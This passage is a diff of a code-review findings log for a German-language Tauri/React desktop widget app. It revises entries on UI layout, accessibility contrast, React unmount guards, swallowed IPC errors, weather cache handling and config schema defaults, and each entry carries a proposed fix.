-@@ -192,3 +192,3 @@ export const CalendarWidget: FC<CalendarWidgetProps> = ({
--        <form onSubmit={handleAddNote} className="relative flex items-center pb-2 shrink-0">
-+        <form onSubmit={handleAddNote} className="flex items-center mb-2 shrink-0">
-+          <div className="relative flex-1">
-           <input
-@@ -204,3 +204,4 @@ export const CalendarWidget: FC<CalendarWidgetProps> = ({
--            className="absolute right-1 top-[3px] p-1 rounded bg-[var(--fluent-accent)] text-black hover:opacity-90 disabled:opacity-30 disabled:cursor-not-allowed transition-all active:scale-95 flex items-center justify-center shadow-xs"
-+            className="absolute right-1 top-1/2 -translate-y-1/2 p-1 rounded bg-[var(--fluent-accent)] text-black hover:opacity-90 disabled:opacity-30 disabled:cursor-not-allowed transition-all active:scale-95 flex items-center justify-center shadow-xs"
-           >
-             <Plus className="w-3 h-3 stroke-[2.5]" />
-           </button>
-+          </div>
-         </form>
-```
+---
 
-### [MINOR] [OPEN] M6-08 In-flow invisible delete button creates asymmetric title truncation in custom launcher items
+### [MINOR] [OPEN] M5-08 Swallowed error in `handleToggleDevice` leaves user without feedback when WinRT disconnection fails
 - **Status**: OPEN
-- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:301-310`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: Custom launcher items display an invisible delete button with `opacity-0 group-hover:opacity-100`. Because the button is in the layout flow, custom item titles truncate 26px earlier than Steam or Epic game titles, and an asymmetric 26px void appears between the title and the "Starten" button when unhovered.
-- **Why**: The delete button occupies layout space even when invisible (`opacity-0`) instead of using `hidden group-hover:block` or conditional absolute layout.
-- **Fix**:
-```diff
---- a/src/widgets/launcher/GameLauncherWidget.tsx
-+++ b/src/widgets/launcher/GameLauncherWidget.tsx
-@@ -305,3 +305,3 @@ export const GameLauncherWidget: FC<GameLauncherWidgetProps> = ({
--                      className="p-1.5 rounded-md text-[var(--fluent-text-tertiary)] hover:text-red-400 hover:bg-red-500/10 transition-colors opacity-0 group-hover:opacity-100 focus:opacity-100"
-+                      className="p-1.5 rounded-md text-[var(--fluent-text-tertiary)] hover:text-red-400 hover:bg-red-500/10 transition-colors hidden group-hover:block focus:block"
-                       aria-label={`${item.name} entfernen`}
-```
-
-### [MINOR] [OPEN] M6-09 Any Win32 application with auto-generated AppUserModelId is falsely branded as "Spotify"
-- **Status**: OPEN
-- **Where**: `src/widgets/spotify/SpotifyWidget.tsx:28-31`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: contract
-- **Scenario**: When playing audio or video from any generic Win32 media player, game, or tool without an explicit AppUserModelId (e.g. Foobar2000, VLC portable, Winamp, OBS, or Chrome background audio with an auto-generated GUID `Microsoft.AutoGenerated.{GUID}`), `formatSourceApp` classifies the application as `"Spotify"`.
-- **Why**: `formatSourceApp` checks `if (lower.startsWith("microsoft.autogenerated") || (lower.includes("{") && lower.includes("}"))) return "Spotify";`. Any application with a Windows-generated GUID AppUserModelID is unconditionally misidentified as Spotify.
-- **Fix**:
-```diff
---- a/src/widgets/spotify/SpotifyWidget.tsx
-+++ b/src/widgets/spotify/SpotifyWidget.tsx
-@@ -28,5 +28,4 @@ export function formatSourceApp(app: string): string {
--  // Windows Win32 auto-generated AppUserModelIds (e.g. "Microsoft.AutoGenerated.{3A54D6C0...}")
--  if (lower.startsWith("microsoft.autogenerated") || (lower.includes("{") && lower.includes("}"))) {
--    return "Spotify";
--  }
-+  if (lower.includes("spotify")) return "Spotify";
-   return app.replace(/\.exe$/i, "");
-```
-
-### [MINOR] [OPEN] M6-10 `TrackProgress` renders interactive scrubber UI and keybindings despite seeking not being implemented
-- **Status**: OPEN
-- **Where**: `src/widgets/spotify/SpotifyWidget.tsx:169-172`, `src/widgets/spotify/TrackProgress.tsx:83-99`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: contract
-- **Scenario**: User clicks on the playback progress bar or uses ArrowLeft/ArrowRight to seek. The scrubber visually jumps to the clicked point, but because `SpotifyWidget` does not supply `onSeek` (and the backend has no `media_seek` command), the progress bar snaps back to the original playback position within 250ms on the next interval tick.
-- **Why**: `TrackProgress` unconditionally renders interactive scrubber styling (`cursor-pointer`, `onClick={handleSeekClick}`, `tabIndex={0}`, `role="progressbar"`) even when `onSeek` is `undefined`.
-- **Fix**:
-```diff
---- a/src/widgets/spotify/TrackProgress.tsx
-+++ b/src/widgets/spotify/TrackProgress.tsx
-@@ -83,5 +83,5 @@ export const TrackProgress: FC<TrackProgressProps> = ({
-       <div
--        className="w-full py-1 -my-1 cursor-pointer group"
--        onClick={handleSeekClick}
--        onKeyDown={handleKeyDown}
--        tabIndex={0}
-+        className={`w-full py-1 -my-1 ${onSeek ? "cursor-pointer group" : "cursor-default"}`}
-+        onClick={onSeek ? handleSeekClick : undefined}
-+        onKeyDown={onSeek ? handleKeyDown : undefined}
-+        tabIndex={onSeek ? 0 : -1}
-```
-
-### [MINOR] [OPEN] M6-11 Play/Pause button uses `text-white` on `--fluent-accent` (`#60cdff`), failing accessibility contrast requirements (1.4:1)
-- **Status**: OPEN
-- **Where**: `src/widgets/spotify/MediaControls.tsx:53`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: In `MediaControls`, the Play/Pause icon is rendered as white on top of `--fluent-accent` (`#60cdff`). In dark mode, the contrast ratio is only 1.43:1, severely violating WCAG 2.1 AA requirements (minimum 3:1) and making the icon difficult to discern. Every other widget in the app correctly uses `text-black` when placed on `--fluent-accent`.
-- **Why**: `MediaControls.tsx` hardcodes `text-white` on `bg-[var(--fluent-accent)]` instead of using high-contrast `text-black`.
-- **Fix**:
-```diff
---- a/src/widgets/spotify/MediaControls.tsx
-+++ b/src/widgets/spotify/MediaControls.tsx
-@@ -53,3 +53,3 @@ export const MediaControls: FC<MediaControlsProps> = ({
--        className={`rounded-full bg-[var(--fluent-accent)] text-white shadow-md ring-1 ring-white/10 transition-all duration-150 hover:scale-105 hover:brightness-110 active:scale-95 disabled:opacity-40 disabled:pointer-events-none flex items-center justify-center ${
-+        className={`rounded-full bg-[var(--fluent-accent)] text-black shadow-md ring-1 ring-white/10 transition-all duration-150 hover:scale-105 hover:brightness-110 active:scale-95 disabled:opacity-40 disabled:pointer-events-none flex items-center justify-center ${
-```
-
-### [MINOR] [OPEN] X1-07 Missing unmount guard for long-running Bluetooth device query and toggle in BluetoothWidget
-- **Status**: OPEN
-- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:91-118`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
+- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:114-118`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: robustness
-- **Scenario**: Windows Bluetooth device enumeration (`DeviceInformation::FindAllAsyncAqsFilter` + `BluetoothDevice::FromIdAsync` per device) can take several seconds when offline paired devices are queried. If the user navigates away or closes the widget during this time, `fetchDevices` and `handleToggleDevice` call `setDevices`, `setIsLoading`, and `setTogglingId` after unmount, generating React unmounted component state update warnings and leaking memory references.
-- **Why**: `BluetoothWidget` lacks an `isMountedRef` check in its asynchronous IPC callback handlers.
+- **Scenario**: User clicks "Trennen" on a connected Bluetooth device. WinRT backend returns `Err("Bluetooth device disconnection is not supported directly via WinRT; please use Windows Settings")`. The button spinner disappears and the device stays connected with no error message displayed to the user.
+- **Why**: `handleToggleDevice` catches the rejection and only prints to `console.error`, omitting a call to `setError`.
 - **Fix**:
 ```diff
 --- a/src/widgets/bluetooth/BluetoothWidget.tsx
 +++ b/src/widgets/bluetooth/BluetoothWidget.tsx
-@@ -86,6 +86,11 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
+@@ -114,3 +114,4 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
+     } catch (err) {
+       console.error("Failed to toggle bluetooth device:", err);
++      setError(err instanceof Error ? err.message : String(err));
+     } finally {
+```
+
+---
+
+### [MINOR] [OPEN] M5-09 Missing unmount cancellation guards in BluetoothWidget async handlers
+- **Status**: OPEN
+- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:82-120`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: Bluetooth widget is unmounted while `get_bluetooth_devices` or `toggle_bluetooth_device` IPC calls are awaiting response. When IPC resolves, state updates (`setDevices`, `setIsLoading`, `setTogglingId`) fire against the unmounted component.
+- **Why**: `BluetoothWidget` lacks an `isMountedRef` check inside its async completion callbacks.
+- **Fix**:
+```diff
+--- a/src/widgets/bluetooth/BluetoothWidget.tsx
++++ b/src/widgets/bluetooth/BluetoothWidget.tsx
+@@ -1,3 +1,3 @@
+-import { useState, useEffect, useCallback, useMemo, type FC } from "react";
++import { useState, useEffect, useCallback, useMemo, useRef, type FC } from "react";
+@@ -86,2 +86,10 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
+   const [togglingId, setTogglingId] = useState<string | null>(null);
 +  const isMountedRef = useRef(true);
++
 +  useEffect(() => {
 +    isMountedRef.current = true;
-+    return () => { isMountedRef.current = false; };
++    return () => {
++      isMountedRef.current = false;
++    };
 +  }, []);
-+
-   const fetchDevices = useCallback(async () => {
-     setIsLoading(true);
-     setError(null);
-     try {
-       const { invoke } = await import("@tauri-apps/api/core");
+@@ -93,4 +101,6 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
        const list = await invoke<BluetoothDeviceInfo[]>("get_bluetooth_devices");
 -      setDevices(list || []);
 +      if (isMountedRef.current) {
 +        setDevices(list || []);
 +      }
      } catch (err) {
-       console.error("Failed to load bluetooth devices:", err);
--      setError(err instanceof Error ? err.message : String(err));
-+      if (isMountedRef.current) {
-+        setError(err instanceof Error ? err.message : String(err));
-+      }
+@@ -98,3 +108,5 @@ export const BluetoothWidget: FC<BluetoothWidgetProps> = ({
      } finally {
 -      setIsLoading(false);
 +      if (isMountedRef.current) {
 +        setIsLoading(false);
 +      }
      }
-   }, []);
 ```
 
-### [MINOR] [OPEN] X1-08 Synchronous ShellExecuteW in execute_quick_action blocks Tokio async runtime thread
+---
+
+### [MINOR] [OPEN] M6-04 Clock Timer Calls State Setter Inside State Updater Function Violating Purity
+- **Where**: `src/widgets/clock/ClockWidget.tsx:98-105`
 - **Status**: OPEN
-- **Where**: `src-tauri/src/actions/mod.rs:127-133`, `src-tauri/src/actions/mod.rs:69-83`
-- **Source**: `r-review` (Cross-Cutting X1) (2026-10-26)
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: When a user triggers a quick action (e.g. sound settings, task manager, or custom URL), `execute_quick_action` is executed as an `async fn` on Tokio's worker thread. It calls `execute_resolved_action`, which performs synchronous Win32 `ShellExecuteW`. If the target involves a complex shell namespace or slow protocol handler, the Tokio worker thread is blocked.
-- **Why**: The Win32 `ShellExecuteW` call is not offloaded using `tokio::task::spawn_blocking`.
+- **Category**: robustness
+- **Scenario**: When the timer countdown reaches 0 seconds, React throws console warnings or causes state desynchronization in Concurrent or Strict Mode.
+- **Why**: `setIsTimerRunning(false)` is called inside the functional updater passed to `setTimerRemaining`. React updater functions must be pure projections without side effects.
 - **Fix**:
 ```diff
---- a/src-tauri/src/actions/mod.rs
-+++ b/src-tauri/src/actions/mod.rs
-@@ -131,3 +131,5 @@ pub async fn execute_quick_action(
-     let resolved = resolve_action_target(&action_id, custom_target.as_deref())?;
--    execute_resolved_action(&resolved)
-+    tokio::task::spawn_blocking(move || execute_resolved_action(&resolved))
-+        .await
-+        .map_err(|e| format!("Action execution task join failed: {}", e))?
- }
-```
-
-### [MINOR] [OPEN] X2-02 Battery Sparkline Graph Collapses to Baseline and Becomes Invisible at Low Charge
-- **Status**: OPEN
-- **Where**: `src/widgets/battery/BatterySparkline.tsx:49-51`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / component
-- **Scenario**: In `BatteryWidget`, when the battery is at 21% with 4 recorded samples (visible in screenshot under "KAPAZITÄTSVERLAUF 4 MESSPUNKTE"), the entire chart area appears empty except for a faint line at the very bottom edge; no trend or gradient fill is visible.
-- **Why**: `BatterySparkline` statically maps 0-100% into a 32px height SVG where 21% resolves to `y = 74.4` (only 8px from bottom). The gradient fill linearly fades from 30% opacity at y=0 to 0% at y=100. At y=74.4, the fill opacity is under 7%, rendering it invisible against dark cards. Without baseline guidelines or dynamic range padding, the graph appears broken.
-- **Fix**:
-```diff
--    // Map 0-100% to Y: 92 is bottom, 8 is top (giving 8% padding)
--    const y = 92 - (clamped / range) * 84;
-+    // Dynamic min-max padding to ensure low charge trends remain legible
-+    const minVal = Math.min(...points);
-+    const maxVal = Math.max(...points);
-+    const effectiveRange = Math.max(maxVal - minVal, 20);
-+    const y = 85 - ((clamped - Math.max(0, minVal - 10)) / (effectiveRange + 15)) * 70;
+--- a/src/widgets/clock/ClockWidget.tsx
++++ b/src/widgets/clock/ClockWidget.tsx
+@@ -95,14 +95,14 @@ export const ClockWidget: FC<ClockWidgetProps> = ({
+   useEffect(() => {
+     if (!isTimerRunning) return;
+     const interval = setInterval(() => {
+-      setTimerRemaining((prev) => {
+-        if (prev <= 1) {
+-          setIsTimerRunning(false);
+-          return 0;
+-        }
+-        return prev - 1;
+-      });
++      setTimerRemaining((prev) => Math.max(0, prev - 1));
+     }, 1000);
+     return () => clearInterval(interval);
+   }, [isTimerRunning]);
++
++  useEffect(() => {
++    if (timerRemaining === 0 && isTimerRunning) {
++      setIsTimerRunning(false);
++    }
++  }, [timerRemaining, isTimerRunning]);
 ```
 
 ---
 
-### [MINOR] [OPEN] X2-03 Retro All-Caps Tracked Section Headers Violate Windows 11 Typography Standard
+### [MINOR] [OPEN] M6-05 Weather `fetchWeather` Swallows `AbortError` and Erroneously Returns Cached Stale Data
+- **Where**: `src/services/weather/openMeteo.ts:262-269`
 - **Status**: OPEN
-- **Where**: `src/widgets/weather/HourlyTrend.tsx:51`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / typography
-- **Scenario**: Section headers across multiple widgets display in all-caps with wide tracking: "STÜNDLICHER TREND", "NÄCHSTE 12H", "5-TAGE-VORHERSAGE", "LAUFZEIT-PROGNOSEN", "KAPAZITÄTSVERLAUF", "VERLAUF", "PAUSIERT".
-- **Why**: Multiple components use `uppercase tracking-wider` or `uppercase tracking-wide`. Windows 11 Fluent guidelines prohibit all-caps headers across UI surfaces; WinUI 3 mandates sentence capitalization (or title case) in `Segoe UI Variable Text` Semibold with standard letter spacing.
-- **Fix**:
-```diff
--      <div className="text-[11px] font-semibold text-[var(--fluent-text-secondary)] uppercase tracking-wider mb-1.5 flex items-center justify-between">
--        <span>Stündlicher Trend</span>
--        <span className="text-[10px] text-[var(--fluent-text-secondary)]/80">Nächste 12h</span>
--      </div>
-+      <div className="text-[11px] font-semibold text-[var(--fluent-text-secondary)] mb-1.5 flex items-center justify-between">
-+        <span>Stündlicher Trend</span>
-+        <span className="text-[10px] text-[var(--fluent-text-secondary)]/80">Nächste 12 Std.</span>
-+      </div>
-```
-
----
-
-### [MINOR] [OPEN] X2-04 Stadium Pill Shapes Used Instead of WinUI 3 Segmented Controls
-- **Status**: OPEN
-- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:209`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / controls
-- **Scenario**: In `GameLauncherWidget`, category filters ("Alle", "Steam", "Epic", "Eigene") are styled as rounded-full oval capsules/pills.
-- **Why**: Windows 11 WinUI 3 specifies Segmented Controls (or TabView / RadioButtons) as rectangular segment buttons with 4px border radius (`rounded-[4px]`) inside a continuous recessed container (`bg-[var(--fluent-control-bg)]`), with an elevated active item, rather than mobile/Android pill tags.
-- **Fix**:
-```diff
--              className={cn(
--                "px-2.5 py-0.5 text-[11px] rounded-full transition-all font-medium whitespace-nowrap",
--                isActive
--                  ? "bg-[var(--fluent-accent)] text-black font-semibold shadow-sm"
--                  : "bg-[var(--fluent-card-bg)] text-[var(--fluent-text-secondary)] hover:bg-[var(--fluent-card-hover)] hover:text-[var(--fluent-text-primary)]"
--              )}
-+              className={cn(
-+                "px-2.5 py-1 text-[11px] rounded-[4px] transition-all font-medium whitespace-nowrap",
-                isActive
--                  ? "bg-[var(--fluent-card-hover)] text-[var(--fluent-text-primary)] font-semibold shadow-xs border border-[var(--fluent-stroke)]"
--                  : "text-[var(--fluent-text-secondary)] hover:text-[var(--fluent-text-primary)] hover:bg-[var(--fluent-control-active)]"
-+                  ? "bg-[var(--fluent-card-hover)] text-[var(--fluent-text-primary)] font-semibold shadow-xs border border-[var(--fluent-stroke)]"
-+                  : "text-[var(--fluent-text-secondary)] hover:text-[var(--fluent-text-primary)] hover:bg-[var(--fluent-control-active)]"
-              )}
-```
-
----
-
-### [MINOR] [OPEN] X2-05 Detached Temperature Unit Renders Awkward "10° c" in Weather Widget
-- **Status**: OPEN
-- **Where**: `src/widgets/weather/WeatherWidget.tsx:160-168`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / typography
-- **Scenario**: In `WeatherWidget`, the current temperature displays as `10°  c` with a detached lowercase `c` and excessive spacing, instead of standard `10°C` or `10°`.
-- **Why**: `WeatherWidget.tsx` wraps the number and degree symbol in a `text-3xl` span and places the unit `C` in a separate `span` with `gap-1 text-xs text-[var(--fluent-text-secondary)]`, creating visual detachment and an apparent lowercase unit.
-- **Fix**:
-```diff
--          <div className="flex items-baseline gap-1">
--            <span
--              className="text-3xl font-light tracking-tight text-[var(--fluent-text-primary)]"
--              data-testid="weather-current-temp"
--            >
--              {current.temperatureC}°
--            </span>
--            <span className="text-xs text-[var(--fluent-text-secondary)]">C</span>
--          </div>
-+          <div className="flex items-baseline">
-+            <span
-+              className="text-3xl font-light tracking-tight text-[var(--fluent-text-primary)]"
-+              data-testid="weather-current-temp"
-+            >
-              {current.temperatureC}°
-            </span>
-+            <span className="text-sm font-normal text-[var(--fluent-text-secondary)] ml-0.5">C</span>
-          </div>
-```
-
----
-
-### [MINOR] [OPEN] X2-06 Tailwind `capitalize` Inappropriately Capitalizes German Verb in Battery Badge
-- **Status**: OPEN
-- **Where**: `src/widgets/battery/BatteryWidget.tsx:216`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / internationalization
-- **Scenario**: When discharging, the battery status badge displays `Wird Entladen 🔋` with an uppercase `E` in "Entladen", violating German grammatical rules.
-- **Why**: `BatteryWidget.tsx` specifies `className="capitalize font-semibold tracking-wide"`. Tailwind's `capitalize` forces the first letter of each word to uppercase. The underlying string from `types/battery.ts` is `"Wird entladen 🔋"`, but CSS transforms it into `"Wird Entladen 🔋"`.
-- **Fix**:
-```diff
-             <Badge
-               variant={badgeInfo.variant}
-               size="sm"
--              className="capitalize font-semibold tracking-wide"
-+              className="font-medium"
-               data-testid="battery-charging-badge"
-             >
-```
-
----
-
-### [MINOR] [OPEN] X2-07 Verbose Technical Label Causes Text Truncation in Speedtest Upload Metric
-- **Status**: OPEN
-- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:255`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: visual / layout
-- **Scenario**: In the 3-column metric cards row of `SpeedtestWidget`, the third card clips its subtext as `Speed test paylo...` with an ellipsis.
-- **Why**: In a 3-column layout on a 360px widget, available card width is ~94px. The hardcoded technical string `"Speed test payload"` (18 characters) exceeds container width and triggers CSS ellipsis truncation.
-- **Fix**:
-```diff
--          <div className="text-[9px] text-[var(--fluent-text-tertiary)] truncate">Speed test payload</div>
-+          <div className="text-[9px] text-[var(--fluent-text-tertiary)] truncate">Cloudflare Edge</div>
-```
-
----
-
-### [MINOR] [OPEN] X2-08 Asymmetrical Navigation Button Widths in Clock Widget Strip
-- **Status**: OPEN
-- **Where**: `src/widgets/clock/ClockWidget.tsx:246, 264, 282, 300`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: MEDIUM
-- **Category**: visual / component
-- **Scenario**: In the top navigation bar of `ClockWidget`, the active tab shows an icon and text label (e.g. `[Clock] Uhr`), while inactive tabs hide their text labels (`hidden`), creating an unbalanced, lopsided navigation strip.
-- **Why**: In `ClockWidget.tsx`, `activeTab !== "uhr" && "hidden"` selectively unmounts/hides labels on inactive tabs inside a `grid grid-cols-4` container.
-- **Fix**: Display consistent icon + label across all tabs, or use icon-only navigation with Fluent tooltips for equal visual rhythm.
-
----
-
-### [MINOR] [OPEN] X2-09 GameLauncher and Calendar Widgets Display Disproportionate Empty Black Voids
-- **Status**: OPEN
-- **Where**: `src/widgets/launcher/GameLauncherWidget.tsx:230-340`, `src/widgets/calendar/CalendarWidget.tsx:210-262`
-- **Source**: `r-review` (Tier 3) (2026-10-26)
-- **Confidence**: MEDIUM
-- **Category**: visual / layout
-- **Scenario**: In the screenshot, `GameLauncherWidget` contains only 1 game ("Brotato") and leaves over 60% of the card height as an empty, dark void. Similarly, `CalendarWidget` dedicates half its vertical space to a sparse "Keine Notizen für diesen Tag" empty state.
-- **Why**: Widget layouts have fixed slot dimensions without responsive layout adaptations (such as grid item tiles or quick-add placeholders) when list items are few.
-- **Fix**: In GameLauncher, render installed items as a Start Menu / Game Bar style tile grid with a "+ Spiel hinzufügen" ghost card when few items exist.
-
----
-
-### [ENHANCEMENT] [OPEN] M4-12 `SkeletonWidget` missing from `src/components/layout/index.ts` barrel export
-- **Status**: OPEN
-- **Where**: `src/components/layout/index.ts:1-3`
-- **Source**: `r-review` (2026-10-26)
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: contract
-- **Scenario**: Other modules import layout components from `@/components/layout`.
-- **Why**: `SkeletonWidget` is located in `src/components/layout/` but omitted from `index.ts`, forcing consumers like `App.tsx` to use deep path imports (`@/components/layout/SkeletonWidget`).
+- **Scenario**: When a weather fetch is canceled via `AbortSignal` (e.g. user selects a different location in Settings or the widget unmounts), `fetch` throws `DOMException: AbortError`. Instead of propagating the abort or resolving cleanly, `fetchWeather` catches all errors and returns stale cached data with `isOffline: true`.
+- **Why**: `fetchWeather` does not inspect `error.name === "AbortError"` or `signal?.aborted` before activating its offline cache fallback, unlike `geocoding.ts:40`.
+- **Fix**:
+```diff
+--- a/src/services/weather/openMeteo.ts
++++ b/src/services/weather/openMeteo.ts
+@@ -260,6 +260,9 @@ export async function fetchWeather(
+     setCachedWeather(weatherData);
+     return weatherData;
+   } catch (error: unknown) {
++    if (error instanceof DOMException && error.name === "AbortError") {
++      throw error;
++    }
+     const cached = getCachedWeather();
+     if (cached) {
+       return { ...cached, isOffline: true };
+```
+
+---
+
+### [MINOR] [OPEN] M6-06 Weather `DailyForecast` Unconditionally Labels First Day as "Heute" Even for Stale Offline Cache
+- **Where**: `src/widgets/weather/DailyForecast.tsx:11-22`
+- **Status**: OPEN
+- **Source**: `r-review` (Tier 2/3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: User launches vvidget while offline. The widget displays cached forecast data from 2 days ago (e.g. Sunday). The first row in the 5-day forecast displays "Heute" next to Sunday's temperatures, falsely presenting 2-day-old weather as current.
+- **Why**: `formatDayName` checks `if (index === 0) return "Heute";` blindly without comparing `dateString` against current date.
+- **Fix**:
+```diff
+--- a/src/widgets/weather/DailyForecast.tsx
++++ b/src/widgets/weather/DailyForecast.tsx
+@@ -10,7 +10,8 @@ const GERMAN_DAY_NAMES = ["So", "Mo", "Di", "Mi", "Do", "Fr", "Sa"];
+ 
+ function formatDayName(dateString: string, index: number): string {
+-  if (index === 0) return "Heute";
++  const todayKey = new Date().toISOString().slice(0, 10);
++  if (dateString === todayKey || (index === 0 && !dateString)) return "Heute";
+   try {
+     const date = new Date(dateString);
+     if (!isNaN(date.getTime())) {
+```
+
+---
+
+### [MINOR] [OPEN] X-ipc-concurrency-07 Swallowed backend IPC errors and optimistic state desynchronization in `useCalendar` and `QuickSettingsWidget`
+- **Status**: OPEN
+- **Where**: `src/hooks/useCalendar.ts:150-209`, `src/widgets/quick-settings/QuickSettingsWidget.tsx:200-228`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: robustness
+- **Scenario**: In `useCalendar`, `addNote`, `removeNote`, and `toggleNote` optimistically update local state and call `safeInvoke`. When the backend returns an error (e.g. disk error or empty text validation), empty `catch {}` blocks swallow the error completely. The state is never rolled back, no error is set, and the user is unaware their note was rejected. In `QuickSettingsWidget`, `handleActionClick` sets `activeFeedback` before the IPC call, and swallows errors with an empty catch block, flashing a false-positive "Gestartet" feedback for 700ms when launch fails.
+- **Why**: Promises from `safeInvoke` and `invoke` are caught by empty catch clauses without error state updates or rollback mechanisms.
+- **Fix**:
+```diff
+--- a/src/hooks/useCalendar.ts
++++ b/src/hooks/useCalendar.ts
+@@ -154,3 +154,4 @@ export function useCalendar(options?: UseCalendarOptions): UseCalendarReturn {
+         });
+-      } catch {
+-        // Ignored in non-Tauri / mock environments
++      } catch (err) {
++        if (isTauri()) {
++          setError(err instanceof Error ? err.message : String(err));
++          void safeInvoke<Record<string, CalendarNote[]>>("get_calendar_events")
++            .then((res) => setEvents(res || {}));
++        }
+       }
+--- a/src/widgets/quick-settings/QuickSettingsWidget.tsx
++++ b/src/widgets/quick-settings/QuickSettingsWidget.tsx
+@@ -201,3 +201,2 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
+   const handleActionClick = async (actionId: string) => {
+-    setActiveFeedback(actionId);
+     try {
+@@ -221,4 +220,6 @@ export const QuickSettingsWidget: FC<QuickSettingsWidgetProps> = ({
+       });
+-    } catch {
+-      // Safe fallback in web/test environment
++      setActiveFeedback(actionId);
++    } catch (err) {
++      console.error("Action execution failed:", err);
+     } finally {
+```
+
+---
+
+### [ENHANCEMENT] [OPEN] M1-09 Oversized Screen Invalidation in `hide_skeleton_preview` and `WM_EXITSIZEMOVE`
+- **Status**: OPEN
+- **Where**: `src-tauri/src/window/win32.rs:326`, `src-tauri/src/window/win32.rs:534`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance
+- **Scenario**: Widget drag concludes and preview is hidden.
+- **Why**: `invalidate_screen_rect(0, 0, 8000, 8000)` calls `RedrawWindow` across the entire multi-monitor desktop workspace and all child windows with `RDW_ALLCHILDREN`, causing unnecessary desktop repaints and transient flicker rather than dirtying only the skeleton window's bounding rect.
+- **Fix**:
+```diff
+--- a/src-tauri/src/window/win32.rs
++++ b/src-tauri/src/window/win32.rs
+@@ -531,5 +531,7 @@ unsafe extern "system" fn widget_subclass_proc(
+                 let skel = get_skeleton_hwnd();
+                 if skel != 0 {
+                     let skel_hwnd = HWND(skel as *mut core::ffi::c_void);
++                    let mut skel_rect = RECT::default();
++                    let _ = GetWindowRect(skel_hwnd, &mut skel_rect);
+                     use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
+                     let _ = ShowWindow(skel_hwnd, SW_HIDE);
+-                    invalidate_screen_rect(0, 0, 8000, 8000);
++                    invalidate_screen_rect(skel_rect.left, skel_rect.top, skel_rect.right - skel_rect.left, skel_rect.bottom - skel_rect.top);
+                 }
+```
+
+### [ENHANCEMENT] [OPEN] M2-09 Schema Version Inconsistency in `AppConfig::default()` Triggers Spurious Migrations
+- **Status**: OPEN
+- **Where**: `src-tauri/src/config/model.rs:240`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: contract
+- **Scenario**: `AppConfig::default()` hardcodes `version: 1`, while the active schema version is 2. Any config serialized from defaults (or missing the `version` key in partial JSON) deserializes as `version: 1`, repeatedly re-triggering schema migration logic and spatial collision resolution in `load_or_recover_config`.
+- **Why**: The default constructor was not updated to reflect current schema version 2.
+- **Fix**:
+```diff
+--- a/src-tauri/src/config/model.rs
++++ b/src-tauri/src/config/model.rs
+@@ -239,3 +239,3 @@ impl Default for AppConfig {
+         Self {
+-            version: 1,
++            version: 2,
+             lock_positions: false,
+```
+
+### [ENHANCEMENT] [OPEN] M4-09 SkeletonWidget missing from layout barrel export
+- **Status**: OPEN
+- **Where**: `src/components/layout/index.ts:1-2`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: contract
+- **Scenario**: Consumers importing components from `@/components/layout` find `SkeletonWidget` missing from the barrel export, forcing direct internal file imports (`@/components/layout/SkeletonWidget`).
+- **Why**: `src/components/layout/index.ts` only exports `HeaderBar` and `WidgetContainer`.
 - **Fix**:
 ```diff
 --- a/src/components/layout/index.ts
 +++ b/src/components/layout/index.ts
-@@ -2,2 +2,3 @@ export { HeaderBar } from "./HeaderBar";
+@@ -2,1 +2,2 @@
  export { WidgetContainer } from "./WidgetContainer";
 +export { SkeletonWidget, type SkeletonWidgetProps } from "./SkeletonWidget";
 ```
 
-### [ENHANCEMENT] [OPEN] M4-13 `.fluent-acrylic` class in `fluent.css` lacks `backdrop-filter` definition
+### [ENHANCEMENT] [OPEN] M4-10 HeaderBar action toolbar div allows pointerdown to bubble and start window drag
 - **Status**: OPEN
-- **Where**: `src/styles/fluent.css:56-58`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
+- **Where**: `src/components/layout/HeaderBar.tsx:102-105`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: MEDIUM
 - **Category**: robustness
-- **Scenario**: Components use `<Card variant="acrylic">` which applies `.fluent-acrylic`.
